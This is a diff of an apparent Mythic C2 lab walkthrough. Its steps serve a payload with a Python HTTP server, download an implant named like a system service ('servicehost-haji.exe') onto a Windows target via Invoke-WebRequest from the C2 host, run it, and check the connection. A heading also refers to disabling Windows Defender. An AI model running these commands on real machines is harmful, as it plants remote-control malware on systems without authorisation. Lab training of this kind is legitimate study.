@@ -144,21 +144,22 @@ Disable Windows Defender:
     
 2. **Serve Payload over HTTP**
     
-    `ufw allow 9999 python3 -m http.server 9999`
-    
+    `ufw allow 9999 
+    `ufw allow 9999`
+    `python3 -m http.server 9999`
+
+
+
 3. **Download on Windows Target**
     
     `Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/servicehost-haji.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe`
     
-4. **Allow Port 80**
     
-    `ufw allow 80`
-    
-5. **Execute Payload**
+4. **Execute Payload**
     
     `.\servicehost-haji.exe`
     
-6. **Verify Connection**
+5. **Verify Connection**
     
     `netstat -anob`
     
